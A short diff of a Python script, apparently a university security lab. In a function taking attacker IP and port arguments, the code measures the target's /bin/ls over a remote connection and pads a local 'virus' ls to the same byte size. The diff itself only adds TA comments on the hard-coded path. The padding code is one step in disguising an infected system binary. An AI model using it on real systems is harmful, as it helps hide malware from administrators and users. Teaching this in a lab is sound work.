@@ -84,6 +84,12 @@ def task2(connection, att_ip, att_port):
         f.write(data)
 
     _stdin, stdout, stderr = connection.exec_command("wc -c ~/../../bin/ls | awk {'print $1'}")
+    # TA : hard code
+    # solution 1:
+    # use "original_byte" to do padding is ok
+    # solution 2:
+    # use "which ls" to get the path of ls before "connection.exec_command"
+
     ls_byte = stdout.read().decode()
     virus_byte = os.popen("wc -c ls | awk '{print $1}'").read()
     padding_size = int(ls_byte) - int(virus_byte) - 4
